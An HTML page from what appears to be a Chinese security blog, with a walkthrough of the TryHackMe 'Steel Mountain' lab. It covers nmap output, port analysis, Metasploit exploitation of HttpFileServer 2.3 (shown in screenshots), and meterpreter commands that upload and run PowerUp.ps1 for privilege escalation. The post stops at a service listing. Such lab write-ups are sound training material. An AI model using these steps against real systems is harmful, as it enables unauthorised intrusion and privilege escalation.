@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Thm-Steel-Mountain - 安全员小周 | ROOT</title>
+    <!-- Prism CSS for Synthax Highlighting (White Theme) -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body class="article-mode">
+    <!-- Sidebar -->
+    <aside class="sidebar">
+        <div class="brand">
+            <span>#_</span> 安全员小周
+        </div>
+
+        <div class="nav-group">
+        <div class="nav-header">知识库</div>
+            <details class="folder-group">
+                <summary>鹏城杯2024</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-12-19-鹏城杯2024-训练.html" class="nav-item">鹏城杯2024-训练</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>计算机网络</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-06-21-计算机网络-OSPF.html" class="nav-item">计算机网络-OSPF</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>综合归档</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-01-30-CISCN-2018Picture-misc-wp.html" class="nav-item">CISCN_2018Picture_misc_wp</a>
+            
+                <a href="/posts/2024-03-13-Rick-pickle.html" class="nav-item">Rick_pickle</a>
+            
+                <a href="/posts/2024-03-19-Blue靶场实践.html" class="nav-item">Blue靶场实践</a>
+            
+                <a href="/posts/2024-04-26-github-PicGo-obsidian.html" class="nav-item">github+PicGo+obsidian</a>
+            
+                <a href="/posts/2024-05-25-刷题记录.html" class="nav-item">刷题记录</a>
+            
+                <a href="/posts/2024-06-07-计算机组成原理-运算器.html" class="nav-item">计算机组成原理_运算器</a>
+            
+                <a href="/posts/2024-06-21-计算机组成原理-存储器.html" class="nav-item">计算机组成原理_存储器</a>
+            
+                <a href="/posts/2024-07-21-redis-利用方式大全.html" class="nav-item">redis_利用方式大全</a>
+            
+                <a href="/posts/2024-07-27-hackmyvm-coffeeshop.html" class="nav-item">hackmyvm_coffeeshop</a>
+            
+                <a href="/posts/2024-08-17-log4shell.html" class="nav-item">log4shell</a>
+            
+                <a href="/posts/2024-09-09-浏览器解码顺序和解析顺序for-xss.html" class="nav-item">浏览器解码顺序和解析顺序for-xss</a>
+            
+                <a href="/posts/2024-09-16-CORS-跨域资源共享.html" class="nav-item">CORS_跨域资源共享</a>
+            
+                <a href="/posts/2024-09-17-ip2domain.html" class="nav-item">ip2domain</a>
+            
+                <a href="/posts/2024-09-17-Oneforall.html" class="nav-item">Oneforall</a>
+            
+                <a href="/posts/2024-09-17-类.html" class="nav-item">类</a>
+            
+                <a href="/posts/2024-10-20-activity.html" class="nav-item">activity</a>
+            
+                <a href="/posts/2024-10-20-manifest.html" class="nav-item">manifest</a>
+            
+                <a href="/posts/2024-10-20-service.html" class="nav-item">service</a>
+            
+                <a href="/posts/2024-10-30-2024网鼎杯青龙组.html" class="nav-item">2024网鼎杯青龙组</a>
+            
+                <a href="/posts/2024-10-30-网鼎杯模拟赛.html" class="nav-item">网鼎杯模拟赛</a>
+            
+                <a href="/posts/2024-11-04-子域名泛解析解析.html" class="nav-item">子域名泛解析解析</a>
+            
+                <a href="/posts/2024-11-05-dns欺骗.html" class="nav-item">dns欺骗</a>
+            
+                <a href="/posts/2024-11-05-mac-泛洪.html" class="nav-item">mac_泛洪</a>
+            
+                <a href="/posts/2024-11-15-服务.html" class="nav-item">服务</a>
+            
+                <a href="/posts/2024-11-17-app大致框架.html" class="nav-item">app大致框架</a>
+            
+                <a href="/posts/2024-11-25-安全狗.html" class="nav-item">安全狗</a>
+            
+                <a href="/posts/2024-11-30-hash扩展攻击.html" class="nav-item">hash扩展攻击</a>
+            
+                <a href="/posts/2024-11-30-RCE绕过.html" class="nav-item">RCE绕过</a>
+            
+                <a href="/posts/2024-11-30-tcp握手.html" class="nav-item">tcp握手</a>
+            
+                <a href="/posts/2024-11-30-WEBDAv.html" class="nav-item">WEBDAv</a>
+            
+                <a href="/posts/2024-11-30-短文件名枚举.html" class="nav-item">短文件名枚举</a>
+            
+                <a href="/posts/2024-12-19-ciscn训练.html" class="nav-item">ciscn训练</a>
+            
+                <a href="/posts/2024-12-25-新星赛.html" class="nav-item">新星赛</a>
+            
+                <a href="/posts/2025-01-07-软件安全赛.html" class="nav-item">软件安全赛</a>
+            
+                <a href="/posts/2025-01-15-jsonp.html" class="nav-item">jsonp</a>
+            
+                <a href="/posts/2025-01-15-同源策略.html" class="nav-item">同源策略</a>
+            
+                <a href="/posts/2025-01-19-一次混淆webshell分析.html" class="nav-item">一次混淆webshell分析</a>
+            
+                <a href="/posts/2025-01-23-hexo博客搭建.html" class="nav-item">hexo博客搭建</a>
+            
+                <a href="/posts/2025-01-29-SMB445端口利用.html" class="nav-item">SMB445端口利用</a>
+            
+                <a href="/posts/2025-01-30-域常见信息枚举.html" class="nav-item">域常见信息枚举</a>
+            
+                <a href="/posts/2025-02-03-红日1.html" class="nav-item">红日1</a>
+            
+                <a href="/posts/2025-02-05-URLDNS链.html" class="nav-item">URLDNS链</a>
+            
+                <a href="/posts/2025-02-14-安全服务实习面经.html" class="nav-item">安全服务实习面经</a>
+            
+                <a href="/posts/2025-02-21-实习该反问什么-.html" class="nav-item">实习该反问什么?</a>
+            
+                <a href="/posts/2025-04-05-c--内存机制和安全.html" class="nav-item">c++内存机制和安全</a>
+            
+                <a href="/posts/2025-06-01-pickle.html" class="nav-item">pickle</a>
+            
+                <a href="/posts/2025-06-02-vllm大模型推理引擎.html" class="nav-item">vllm大模型推理引擎</a>
+            
+                <a href="/posts/hello-world.html" class="nav-item">我的第一篇安全文章</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>算法</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-20-算法-Init.html" class="nav-item">算法-Init</a>
+            
+                <a href="/posts/2024-09-20-算法-分治和逆序.html" class="nav-item">算法-分治和逆序</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>漏洞复现</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-11-30-常见服务器解析漏洞.html" class="nav-item">常见服务器解析漏洞</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>湖北大学</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-05-14-湖北大学-奇安信杯完整版wp.html" class="nav-item">湖北大学-奇安信杯完整版wp</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>横向移动</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-08-横向移动-远程创建进程.html" class="nav-item">横向移动-远程创建进程</a>
+            
+                <a href="/posts/2024-09-10-横向移动-WMI.html" class="nav-item">横向移动-WMI</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>权限提升</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-03-04-权限提升-Linux-passwd提权.html" class="nav-item">权限提升-Linux passwd提权</a>
+            
+                <a href="/posts/2024-03-09-权限提升-windows计划任务提权.html" class="nav-item">权限提升-windows计划任务提权</a>
+            
+                <a href="/posts/2024-03-19-权限提升-windows服务提权.html" class="nav-item">权限提升-windows服务提权</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>文件上传</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-18-文件上传-php.html" class="nav-item">文件上传-php</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>数学基础信安总结</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-04-25-数学基础信安总结-一次遗忘的作业.html" class="nav-item">数学基础信安总结-一次遗忘的作业</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>操作系统</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-11-操作系统-api接口.html" class="nav-item">操作系统-api接口</a>
+            
+                <a href="/posts/2024-09-11-操作系统-启动.html" class="nav-item">操作系统-启动</a>
+            
+                <a href="/posts/2024-09-11-操作系统-基础认识.html" class="nav-item">操作系统-基础认识</a>
+            
+                <a href="/posts/2024-10-20-操作系统-内核.html" class="nav-item">操作系统-内核</a>
+            
+                <a href="/posts/2024-10-20-操作系统-进程.html" class="nav-item">操作系统-进程</a>
+            
+                <a href="/posts/2024-11-12-操作系统启动实验.html" class="nav-item">操作系统启动实验</a>
+            
+                <a href="/posts/2024-11-12-操作系统进程管理实验.html" class="nav-item">操作系统进程管理实验</a>
+            
+                <a href="/posts/2024-12-25-操作系统概念集合.html" class="nav-item">操作系统概念集合</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>外联木马分析</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-12-26-外联木马分析-ciscn.html" class="nav-item">外联木马分析-ciscn</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>域整理</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-27-域整理-基础.html" class="nav-item">域整理-基础</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>内网穿透</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-14-内网穿透-ligolo使用.html" class="nav-item">内网穿透-ligolo使用</a>
+            
+                <a href="/posts/2025-01-14-内网穿透-ssh搭建.html" class="nav-item">内网穿透-ssh搭建</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>内网安全</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-29-内网横向的一些方式.html" class="nav-item">内网横向的一些方式</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>VULNHUB</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-02-01-vulnhub-vegeta.html" class="nav-item">vulnhub-vegeta</a>
+            
+                <a href="/posts/2024-07-13-Vulnhub-Aiweb1.html" class="nav-item">Vulnhub-Aiweb1</a>
+            
+                <a href="/posts/2024-07-14-Vulnhub-Breakout.html" class="nav-item">Vulnhub-Breakout</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>TRYHACKME</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-02-01-Tryhackme-Overpass.html" class="nav-item">Tryhackme-Overpass</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>THM</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-05-14-Thm-alfred.html" class="nav-item">Thm-alfred</a>
+            
+                <a href="/posts/2024-05-14-Thm-Steel-Mountain.html" class="nav-item">Thm-Steel-Mountain</a>
+            
+                <a href="/posts/2024-08-17-Thm-Gane-zone.html" class="nav-item">Thm-Gane_zone</a>
+            
+                <a href="/posts/2024-08-17-Thm-Hackpark.html" class="nav-item">Thm-Hackpark</a>
+            
+                <a href="/posts/2024-08-17-Thm-Skynet.html" class="nav-item">Thm-Skynet</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>SQLI</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-03-19-sqli-labs靶场-二次注入.html" class="nav-item">sqli-labs靶场-二次注入</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>SQL</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-03-30-sql-学习-day1.html" class="nav-item">sql_学习_day1</a>
+            
+                <a href="/posts/2024-05-03-sql-索引.html" class="nav-item">sql-索引</a>
+            
+                <a href="/posts/2024-05-03-sql-表修改和创建.html" class="nav-item">sql-表修改和创建</a>
+            
+                <a href="/posts/2024-05-03-sql-表增删查改.html" class="nav-item">sql-表增删查改</a>
+            
+                <a href="/posts/2024-05-03-sql-视图创建.html" class="nav-item">sql-视图创建</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>SNORT</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-12-09-snort-ips.html" class="nav-item">snort-ips</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>PHPMYADMIN</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-14-phpmyadmin-getshell姿势.html" class="nav-item">phpmyadmin-getshell姿势</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>NSSCTF</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-01-26-nssctf-round-16web部分wp.html" class="nav-item">nssctf-round#16web部分wp</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>JAVA</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-11-java-包和输入输出.html" class="nav-item">java-包和输入输出</a>
+            
+                <a href="/posts/2024-09-11-java-数据结构.html" class="nav-item">java-数据结构</a>
+            
+                <a href="/posts/2024-09-11-java-逻辑结构.html" class="nav-item">java-逻辑结构</a>
+            
+                <a href="/posts/2025-02-05-java动态代理.html" class="nav-item">java动态代理</a>
+            
+                <a href="/posts/2025-02-05-java反射.html" class="nav-item">java反射</a>
+            
+                <a href="/posts/2025-02-05-java反序列化.html" class="nav-item">java反序列化</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>HTB</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-04-25-HTB-LAME.html" class="nav-item">HTB-LAME</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>HACKMYVM</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-15-Hackmyvm-leet.html" class="nav-item">Hackmyvm-leet</a>
+            
+                <a href="/posts/2024-10-10-Hackmyvm-Lookup.html" class="nav-item">Hackmyvm-Lookup</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>EW</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-17-ew-内网.html" class="nav-item">ew-内网</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>DOCKER</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-02-01-docker.html" class="nav-item">docker</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>CTF</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-03-03-sictf-web.html" class="nav-item">sictf_web</a>
+            
+                <a href="/posts/2024-03-19-CTF长城杯.html" class="nav-item">CTF长城杯</a>
+            
+                <a href="/posts/2024-03-30-ctf-misc-掌控腾龙杯.html" class="nav-item">ctf-misc-掌控腾龙杯</a>
+            
+                <a href="/posts/2024-05-14-ctf刷题记录1.html" class="nav-item">ctf刷题记录1</a>
+            
+                <a href="/posts/2024-05-14-ctf刷题记录2.html" class="nav-item">ctf刷题记录2</a>
+            
+                <a href="/posts/2024-05-14-ctf刷题记录3.html" class="nav-item">ctf刷题记录3</a>
+            
+                <a href="/posts/2024-07-21-ctfhub-ssrf基础认证.html" class="nav-item">ctfhub_ssrf基础认证</a>
+            
+                <a href="/posts/2024-07-28-ctf刷题记录4.html" class="nav-item">ctf刷题记录4</a>
+            
+                <a href="/posts/2024-09-11-2024-9-11-CTF.html" class="nav-item">2024-9-11-CTF</a>
+            
+                <a href="/posts/2024-09-12-CTF-Ciscn-cyberpunk.html" class="nav-item">CTF-Ciscn-cyberpunk</a>
+            
+                <a href="/posts/2024-10-02-CTF刷题buuctf.html" class="nav-item">CTF刷题buuctf</a>
+            
+                <a href="/posts/2025-01-19-suctf.html" class="nav-item">suctf</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>BEGIN</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-02-11-begin-ctf.html" class="nav-item">begin-ctf</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>ANDROID</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-16-2024-1-2-12-Android-Studio配置.html" class="nav-item">2024-1.2.12-Android-Studio配置</a>
+            
+                <a href="/posts/2024-09-19-Android-UI设计.html" class="nav-item">Android_UI设计</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>AD域枚举信息</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-08-AD域枚举信息-BloodHound.html" class="nav-item">AD域枚举信息-BloodHound</a>
+            
+                <a href="/posts/2024-09-08-AD域枚举信息-Microsoft控制台MMC.html" class="nav-item">AD域枚举信息-Microsoft控制台MMC</a>
+            
+                <a href="/posts/2024-09-08-AD域枚举信息-powershell-cmdlet.html" class="nav-item">AD域枚举信息-powershell-cmdlet</a>
+            
+                <a href="/posts/2024-09-08-AD域枚举信息-命令枚举.html" class="nav-item">AD域枚举信息-命令枚举</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>4</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-04-28-4-28ctf急切刷题.html" class="nav-item">4-28ctf急切刷题</a>
+            </div></details></div>
+
+        <div class="user-profile">
+            <div class="avatar" style="background:#333; border:1px solid #00ff41; color:#00ff41;">K</div>
+            <div style="font-size: 0.9rem; font-weight: 500; color: #00ff41;">安全员小周</div>
+        </div>
+    </aside>
+
+    <!-- Main Content -->
+    <div class="main-wrapper">
+        <header class="top-header">
+            <div class="breadcrumb">
+                ~/home/THM/Thm-Steel-Mountain ...
+            </div>
+
+            <div class="search-container">
+                <input type="text" class="search-input" placeholder="grep -r 'keyword' ." id="searchInput">
+                <div class="search-results" id="searchResults"></div>
+            </div>
+        </header>
+
+        <main class="content-area">
+            <h1 class="article-title">Thm-Steel-Mountain</h1>
+            <div class="markdown-body">
+                <p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240514215439.png" alt="image.png"></p>
+<p>机器  </p>
+<p>Steel Mountain 钢山</p>
+<p>状态</p>
+<p>未知</p>
+<p>系统</p>
+<p>windows</p>
+<p>详细信息</p>
+<p>HttpFileServer 2.3 远程代码执行 getshell PowerUp.ps1 服务提权</p>
+<h3>枚举端口</h3>
+<pre><code class="language-shell">Not shown: 989 closed portsPORT
+STATE SERVICE80/tcp
+open  http135/tcp   open  msrpc139/tcp   open  netbios-ssn445/tcp   open  microsoft-ds3389/tcp  open  ms-wbt-server8080/tcp  open  http-proxy49152/tcp open  unknown49153/tcp open  unknown49154/tcp open  unknown49155/tcp open  unknown49156/tcp open  unknown
+</code></pre>
+<h3>开始前的小乐趣先🐍个人</h3>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426145608.png" alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426145853.png" alt="image.png"></p>
+<blockquote>
+<p>完美简单的 查找</p>
+</blockquote>
+<h3>详细枚举信息</h3>
+<pre><code class="language-shell">Starting Nmap 7.60 ( https://nmap.org ) at 2024-04-26 08:00 BSTNmap scan report for ip-10-10-35-123.eu-west-1.compute.internal (10.10.35.123)Host is up (0.00041s latency).PORT
+STATE SERVICE
+VERSION80/tcp
+open  http
+Microsoft IIS httpd 8.5| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/8.5|_http-title: Site does not have a title (text/html).135/tcp   open  msrpc
+Microsoft Windows RPC139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds3389/tcp  open  ssl
+Microsoft SChannel TLS| fingerprint-strings: |  TLSSessionReq: |
+f+Q4l|
+steelmountain0|
+240425063400Z|
+241025063400Z0|
+steelmountain0|
+TANM|
+(F!WM|
+92kC|
+1(G^y|
+KNu!|
+95V)|
+$00|
+;
+iFf|
+87&amp;j|
+~%*d7|
+0CPT|_
+AeCu| ssl-cert: Subject: commonName=steelmountain| Not valid before: 2024-04-25T06:34:00|_Not valid after:  2024-10-25T06:34:00|_ssl-date: 2024-04-26T07:02:06+00:00; 0s 
+from scanner time.8080/tcp  open  http
+HttpFileServer httpd 2.3|_http-server-header: HFS 2.3|_http-title: HFS /49152/tcp open  msrpc
+Microsoft Windows RPC49153/tcp open  msrpc
+Microsoft Windows RPC49154/tcp open  msrpc
+Microsoft Windows RPC49155/tcp open  msrpc
+Microsoft Windows RPC49156/tcp open  msrpc
+Microsoft Windows RPC。### 无法识别 3389的 服务版本1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerpr
+int at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3389-TCP:V=7.60%I=7%D=4/26%Time=662B5139%P=x86_64-pc-linux-gnu%r(TLSF:SSessionReq,346,\x16\x03\x03\x03A\x02\0\0M\x03\x03f\+Q4l\xbd\xd2\xa6%\SF:xd0\x151\xaf\xf5\x8c\x19E,\x8b\xe9&gt;T\x02\xda\x9cP\x07:4\x04\xa6\xf0\x20SF:;
+#\0\x002\x93\x1f\xa1\xeb\x9d\x15\xef{
+\xf1%\x7f\x9d\xc4-\xca\x15\xf5\?\SF:xae\xa6\xff\x11\+\xd4\xd66a\0/\0\0\x05\xff\x01\0\x01\0\x0b\0\x02\xe8\0\SF:x02\xe5\0\x02\xe20\x82\x02\xde0\x82\x01\xc6\xa0\x03\x02\x01\x02\x02\x10SF:5\xf3\xaa\xabz~\*\xaeF\xf3\xc9yp\xb62\xa10\r\x06\t\*\x86H\x86\xf7\r\x01SF:\x01\x05\x05\x000\x181\x160\x14\x06\x03U\x04\x03\x13\rsteelmountain0\x1SF:e\x17\r240425063400Z\x17\r241025063400Z0\x181\x160\x14\x06\x03U\x04\x03SF:\x13\rsteelmountain0\x82\x01\&quot;0\r\x06\t\*\x86H\x86\xf7\r\x01\x01\x01\x0SF:5\0\x03\x82\x01\x0f\x000\x82\x01\n\x02\x82\x01\x01\0\xa4\x93\xd2\x83\xcSF:5K\xfde\xe5\|C4\xff\x06u\xde%\xf8\xb4Z\x1e\xdb\xbf\xa2\x8b\xf4\x8f7\xdfSF:R\xfec\xe1g}
+u\x0e\xf8A9\xe8\x0cc\xb1\xca\xce\x9b\x1fp\x19\xcc\x97\x11\xSF:fc\x1c\xaa\xf0\x0c\x9e\x17\xd1\xa1\$\x93\xd2\xb6o\x20\x99Z\xfa\x89\xa9\SF:0C\x1b\x86\xfd\x8f\xba\(\xa4\.\xf6/\x03\xd1\xd9Bu\xbc\xd8}
+,\xdcTANM\xe1SF:\xfe\x01\xae\x17\x1cK\xe4\xaa}
+h\xcb\x8f!\xff\(F!WM\xfd\xfe\xe892kC\xa5\SF:x96\xaa1\(G\^y\xdfiZX\xa4#\x82\xbao\xe4\x85\&quot;Q,\xae\xc9\xcd\x98\xe3e\xfSF:5\x1d2`\xb2\x80KNu!\xe6\xd8F;
+\0\x1aau\xe5\x8d\xd7\xab\^\xd9\xc7\x04\x10SF:\xc6\x91\xa2\xb6\xc6\xa9\xda9;
+\xf6\xefw\xf1\x93N\x0ctL~\xc8\xc5\r\x1d\xSF:9dYpV\x82\x9d\xe0SG_\xd9\x11f\xf0\x196G\xc9\xe1\xd0M\n#\xec;
+\xff\x8fG#\SF:x04\x8c\xec8\xbf\xca\x84J\x97\xf5\xcd95V\)\xe3\xf6Q}
+r\xbf\xee}
+\x02\x03\SF:x01\0\x01\xa3\$0\&quot;0\x13\x06\x03U\x1d%\x04\x0c0\n\x06\x08\+\x06\x01\x05\SF:x05\x07\x03\x010\x0b\x06\x03U\x1d\x0f\x04\x04\x03\x02\x0400\r\x06\t\*\xSF:86H\x86\xf7\r\x01\x01\x05\x05\0\x03\x82\x01\x01\0%u\x97\xd5\x17M\x0f\xeSF:7\xcd\xf0\r\xd1;
+iFf\xd4\xf3\xbc\xd9c\0\xc7\x03\x91J\xd0&lt;d\x01\x08\xf6G_SF:l\x9dh\x89v\xf7\x14\x1a\xe0\xa7tr\x86\xed\xc6\xb0\xd6\xbb\x8b\xdaNT\xeaSF:\xd2\x08\xf8\x8c\x0cF\x1e\x7f3\xd0\x85D\x9e\xb4\+\xa687&amp;j\x8fa2\x19\xaSF:c\xd9\x05\x15~%\*d7\x93\&quot;\xc4-\x11\xff0CPT\x86\x02\xd3m`\x07%\xeb\xa5\xSF:16\x17%=\xaa\xf6\x95WKB\x87\xa7H\x12\xb9\xcb\xd3\x88\x8c\xf5%\xd1\xd3\xSF:be\xd0\xf4\x05\xc0\x16\x93\xd1\x1eg\xf8\x94\x8f8\xc0J\xb8g\xf3\xe5\x8d\SF:xf8\xab\xbb\xf4\xc7v\x8c\+\xedMY\xab\xce\x1a\x9a\x83s\xdbk\xf1\x14E\xa8SF:AeCu\x9e\x93\x85\xb5\[\xcf\x8b\xf9\xa1\xd7\x8f\xf5tPT\xcb\xa6o8\xadQ\xcSF:9!\x87y\xd2=;
+\xe4o\x07\xedh\[\x0e\x9d\xb6\xf2\xaf\^\xfa\x89G\xc4\xcf}
+\xSF:e5\xfc-\x8cg\xebZ@\*\xe1Al\x87x\xc0{
+Hy\xab\xf5,\xf6\r\xe7\x154n\xff\xcbSF:\x0e\0\0\0);
+MAC Address: 02:46:B7:98:AF:B5 (Unknown)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Microsoft Windows Server 2008 SP2 Datacenter Version (98%), Microsoft Windows Server 2012 (96%), Microsoft Windows Server 2012 R2 (96%), Microsoft Windows Server 2012 R2 Update 1 (96%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (96%), Microsoft Windows Vista SP1 (95%), Microsoft Windows Server 2012 or Server 2012 R2 (93%), Microsoft Windows Server 2008 R2 (93%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (93%), Microsoft Windows Server 2008 SP1 (93%)No exact OS matches for host (test conditions non-ideal).Network Distance: 1 hopService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:46:b7:98:af:b5 (unknown)| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode: |   2.02: |_
+Message signing enabled but not required| smb2-time: |   date: 2024-04-26 08:02:06|_  start_date: 2024-04-26 07:33:53
+</code></pre>
+<h3>详细分析一下</h3>
+<h5>80</h5>
+<blockquote>
+<p>***1. <strong>Microsoft IIS httpd 8.5</strong>：该服务器运行的是Microsoft Internet Information Services（IIS）8.5版本，这是Microsoft的网络服务器软件。</p>
+</blockquote>
+<ol start="2">
+<li><p>*<strong>http-methods</strong>：</p>
+<p>这行提到可能的HTTP方法。<code>TRACE</code>是一种潜在危险的方法，它会将收到的HTTP请求返回给客户端，可能会被用于跨站追踪攻击（Cross-Site Tracing，XST）等攻击手法。</p>
+</li>
+</ol>
+<h5>139 445</h5>
+<blockquote>
+<p>告诉我们了操作系统<br>Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</p>
+</blockquote>
+<h5>3389</h5>
+<blockquote>
+<p>根据你提供的扫描结果，看起来端口3389上运行的是Microsoft SChannel TLS服务，通常用于远程桌面连接（Remote Desktop Protocol，RDP）。以下是一些分析：</p>
+</blockquote>
+<ol>
+<li><p>**<strong>3389/tcp open ssl</strong>：这表示端口3389上运行的服务是基于SSL（Secure Sockets Layer）的，通常用于加密通信。在此情况下，它是Microsoft SChannel TLS，表明使用的是Windows的加密库。</p>
+</li>
+<li><p>*<strong>fingerprint-strings</strong>：这部分提供了一些TLS握手阶段的字符串。这些字符串可能有助于识别所使用的TLS版本或其他信息。</p>
+</li>
+<li><p>*<strong>ssl-cert</strong>：这是与SSL证书相关的信息。在这里，证书的主题(commonName)是 “steelmountain”，证书的有效期从 2024年4月25日到2024年10月25日。</p>
+</li>
+<li><p>*<strong>ssl-date</strong>：这是SSL证书的日期信息，显示了扫描时的日期和时间，以及与证书相关的时间间隔。</p>
+</li>
+</ol>
+<h5>8080</h5>
+<blockquote>
+<p>端口8080上运行着HttpFileServer（HFS）2.3版本，这是一个基于HTTP协议的文件服务器软件。这意味着该服务器允许用户通过Web浏览器访问和管理文件。通过HTTP请求，用户可以上传、下载、删除和浏览服务器上的文件。在这种情况下，服务器的HTTP响应头中包含了”Server”字段，指示服务器版本为HFS 2.3。此外，HTTP响应标题显示为”HFS /“，表明服务器根目录的标题为”HFS”。****<br>|</p>
+</blockquote>
+<p>8080端口的 HttpFileServer2.3远程代码执行</p>
+<p><a href="HttpFileServer2.3.md">HttpFileServer2.3</a></p>
+<h3>打点</h3>
+<blockquote>
+<p>8080 端口服务器HttpFileServer（HFS）2.3<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426153448.png" alt="image.png"></p>
+</blockquote>
+<blockquote>
+<p>启动msf 直接开始打<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426154233.png" alt="image.png"><br>配置相关配置</p>
+</blockquote>
+<h3>Getshell</h3>
+<blockquote>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426215559.png" alt="image.png"></p>
+</blockquote>
+<h2>权限提升</h2>
+<p>首先先拿脚本信息收集</p>
+<p><a href="%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md#%E8%84%9A%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">脚本信息收集</a></p>
+<blockquote>
+<p>首先先下载 之后上传到 目标windows机器</p>
+</blockquote>
+<pre><code class="language-shell">upload /home/tom/get_power/windows/PowerUp.ps1
+</code></pre>
+<p>METERPRETER 加载</p>
+<p><a href="post.md#Load">Load</a></p>
+<blockquote>
+<p>load 加载</p>
+</blockquote>
+<pre><code class="language-powershell">meterpreter &gt; load PowershellLoading extension powershell...Success.meterpreter &gt; Powershell_shel[-] Unknown command: Powershell_shelmeterpreter &gt; Powershell_shell[-] Unknown command: Powershell_shellmeterpreter &gt; powershell_shellPS &gt; 
+</code></pre>
+<blockquote>
+<p>执行扫描脚本<br>.\PowerUp.ps1<br>开启脚本测试看到许多服务</p>
+</blockquote>
+<p>windows提权信息收集</p>
+<p><a href="%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md">信息收集</a></p>
+<p>windows提权服务提权</p>
+<p><a href="%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83.md">服务提权</a></p>
+<pre><code class="language-powershell">ServiceName
+: AdvancedSystemCareService9Path
